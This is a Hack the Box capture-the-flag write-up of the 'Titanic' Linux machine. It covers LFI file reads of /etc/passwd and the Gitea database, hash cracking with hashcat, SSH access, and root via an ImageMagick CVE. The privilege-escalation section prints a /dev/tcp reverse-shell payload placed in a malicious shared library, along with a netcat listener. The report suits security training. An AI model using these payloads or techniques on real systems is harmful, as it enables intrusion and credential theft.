# Hack the Box - Titanic

**Author:** Garrett Segura

**Date:** 2025/9/19

**Difficulty:** Easy

**OS:**  Linux

**Summary**: An easy Linux box involving a local file inclusion vulnerability that allows users to dump the database, retrieve credentials, and exploit an vulnerable binary to gain root level access.

---

## Table of Contents
1. Report Summary
2. Scope and Rules
3. Recon
4. Enumeration
5. Initial Access
6. Privilege Escalation
7. Mitigations and Recommendations
8. Lessons Learned
9. Appendix: Full Command Log
---

## 1. Report Summary
A local file inclusion vulnerability in the /download endpoint allows an attacker to retrieve files through the ?ticket parameter. This opens a window on the system to permit users to read/download arbitrary files, ultimately giving users direct access to the  gitea database file. The database contains weak credentials that can easily be cracked to gain unauthorized access to the developer account. A vulnerable binary, magick, is out of date and can simply be exploited by copy and pasting an exploit from the internet with very little modification to gain root level access, escalating privileges from the developer account.

---

## 2. Scope and Rules

#### Scope
**Target**: 10.10.11.55

#### Rules
**Permitted Testing**: Recon, Exploitation, Post-Exploitation of the Titanic (10.10.11.55) machine. 

**Non-Permitted Testing**: Hack the Box infrastructure, other players, any security testing outside of the Hack the Box platform while connected to their network.

**Disclosure**: This write up contains a full walkthrough. However, flags, file contents, and credentials will not be included unless otherwise provided from the start. I highly encourage individuals to try on their own and use this guide as a last resort. Hack the Box takes their platform seriously and I will uphold their terms of service and guidelines, which can be found here https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines. 

---

## 3. Recon

#### nmap
`nmap -p- -vv -A -oN scans/nmap 10.10.11.55` - nmap scan to reveal open ports.

There are two open ports on the machine - 
*22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)* 

*80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52* 

The nmap scan also shows a redirect to http://titanic.htb, that I can add to the */etc/hosts* file. 

#### ffuf
`ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -fw 20` - ffuf allows me to scan for virtual hosts.

With any web server, I like to check virtual hosts first for any quick hits that I can also add to the */etc/hosts* file, and immediately I got back a *dev* host which I can add. 

---
## 4. Enumeration

At this point I navigate to the main site to look around. I looked through the source code and did not find anything too interesting. There is a feature to book a trip that asks the user to enter their desired information, this could be the way to exploit the system. When booking a trip and looking at the network information in the developer tools, I see two requests going through, a POST request to the */book* endpoint, and a GET request to */download?ticket=6acf8344-bea8-48c7-8c16-f269d36634d1.json*. This is very interesting, let's tamper with the *ticket* parameter to see if there is a *Local File Inclusion (LFI)*  vulnerability. We can move over to Burp, the swiss army knife of web hacking, as this will make enumeration easier.
#### Burp Suite
Once I have Burp loaded, I can capture the request from booking a trip through the proxy and send it to the Repeater, specifically the request to the */download* endpoint. With Repeater I can easily modify the *ticket* parameter to test for file inclusion, in which I was able to read the */etc/passwd* file on the victim machine by sending `/download?ticket=/etc/passwd`. This is a good find indeed. Now that I know an LFI vulnerability exists on the main site, I want to see if there is any hidden gems on *dev.titanic.htb*. 

#### Gitea
Arriving at the *dev* site, I am greeted with a *gitea* page. I went to the *Explore* tab and found two repositories, *flask-app* and *docker-config*. *flask-app* contains the source code of the *titanic.htb* site and shows where the LFI vulnerability lies - http://dev.titanic.htb/developer/flask-app/src/branch/main/app.py. *docker-config* contains *mysql* and *gitea* repos. Taking a peak inside the *gitea* repo I found this - `/home/developer/gitea/data:/data`. This is very interesting as gitea uses the *app.ini* file as it's main configuration, and could potentially be inside this directory. After doing some reading on gitea documentation and looking up where the *app.ini* file could be located, I tried a few different locations with the LFI on the main site and stumbled upon `/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini`. While the file contains alot of information, this particularly stands out - `PATH = /data/gitea/gitea.db`, which is using sqlite3. This is the database file. Now if I send `/download?ticket=/home/developer/gitea/data/gitea/gitea.db` I can read the database file, let's download this for easier viewing in sqlite.

#### curl
`curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o files/gitea.db` - download the database file.

`curl -O https://raw.githubusercontent.com/hashcat/hashcat/master/tools/gitea2hashcat.py` - download the gitea2hashcat tool.

#### sqlite3
`sqlite3 gitea.db` - Using sqlite I can view the database file.

`.tables` shows a list of tables in the database, with a user table. 

`.schema user` - shows the columns in the *user* table. 

`select email, salt, passwd, passwd_hash_algo from user;`  - we could dump the entire table, but just dumping the credential and algorithm columns helps clean up the output.

`sqlite3 gitea.db 'select salt, passwd from user' | ./gitea2hashcat.py > hash.txt` - doing some more research I found a *gitea2hashcat* program that will convert the gitea hashes to a crackable format for hashcat. 

#### hashcat
`hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt` - hashcat is used to crack the passwords dumped from the *gitea.db* file I found earlier. 

I let hashcat run for some time and only the *developer* account seems to be crackable. With the newly found credential I can attempt to ssh into the developer account. 

---

## 5. Initial Accesss

`ssh developer@10.10.11.55` - ssh into the *developer* account. 

`sudo -l` - check for sudo permissions on the *developer* account, there are no sudo permissions.

`id` - show the current users user ID, group ID, and associated groups, there are no groups the *developer* account has access to.

`find / -perm -4000 2>/dev/null` - there are a few layers to this command. The `find` command takes  a path and will recursively search down the file system. `-perm -4000` says "search for any files with the permissions set to 4000". I am looking for binaries (executables) with the SUID bit set. If the SUID bit is set on a binary, the binary will be executed as the owner of the file. This means if I can find a binary that executes as *root*, I can potentially abuse these permissions as a privilege escalation. There is quite a bit of output here, but using tools such as https://gtfobins.github.io/, you can search for any of the listed binaries and filter down to the SUID bit to find a potential privilege escalation path. `2>/dev/null` will redirect *file descriptor 2* (stderr) to */dev/null*. In simple terms, "take any errors and throw them away", this helps reduce noise on the output. Nothing here, so let's keep looking.

`find / -name \*.sh -user root 2>/dev/null | grep -E -v 'lib|share|linux'` - as the *developer* user, I can not read others *crontab* file, but I can search for any scripts that *root* owns. There aren't any other user accounts to pivot into, so root is on my list for now. Using `grep` I can filter out some of the normal noise and try to find any abnormal/standout scripts. In the midst of the output, I found `/opt/scripts/identify_images.sh`, that I am able to read. The script is using `magick` to modify files. Doing some more research I found CVE-2024-41817, and a proof of concept at https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

`magick --version` - shows the version lines up with the vulnerability.

---
## 6. Privilege Escalation

Reading the script I can see that it is accessing files in `/opt/app/static/assets/images/`. 

`ls -l /opt/app/static/assets/images` - I can see the *metadata.log* file has been recently updated. It's possible the *identify_images.sh* script is on a timer. Using the proof of concept on github, I modified the *libxcb.so.1* file to contain a reverse shell payload - `"/bin/bash -c 'bash -i >& /dev/tcp/>IP</>PORT< 0>&1'"`, and set up a netcat listener on my machine using `nc -lvnp >PORT<`. This file must be placed in the same directory that the `magick` program is searching.

A few moments later and a root shell had spawned, giving me root access to the machine. 

---

## 7. Mitigations and Recommendations
- Properly sanitize the /download?ticket= endpoint to prevent file inclusion.
- Use strong credentials when creating accounts, at minimum - one lowercase letter, one uppercase letter, one digit, one special character, and twelve characters in length.
- Keep software/programs up to date to mitigate vulnerabilities. 

---

## 8. Lessons Learned
- Local file inclusion is a way to enumerate further into the system.
- Gitea requires a proper format for the hashes to become crackable.
- Investigate scripts to find potential cronjobs.
- Take the time to properly enumerate the system to find initial and escalation paths.

---

## 9. Appendix: Full Command Log
`nmap -p- -vv -A -oN scans/nmap 10.10.11.55`

`ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -fw 20`

`curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o files/gitea.db`

`sqlite3 gitea.db`

`.tables`

`.schema user`

`select email, salt, passwd, passwd_hash_algo from user;` 

`curl -O https://raw.githubusercontent.com/hashcat/hashcat/master/tools/gitea2hashcat.py`

`sqlite3 gitea.db 'select salt, passwd from user' | ./gitea2hashcat.py > hash.txt`

`ssh developer@10.10.11.55`

`sudo -l`

`id`

`find / -perm -4000 2>/dev/null`

`find / -name \*.sh -user root 2>/dev/null | grep -E -v 'lib|share|linux'

`cat /opt/scripts/identify_images.sh`

`magick --version` 

`ls -l /opt/app/static/assets/images` 

`nc -lvnp >PORT<`
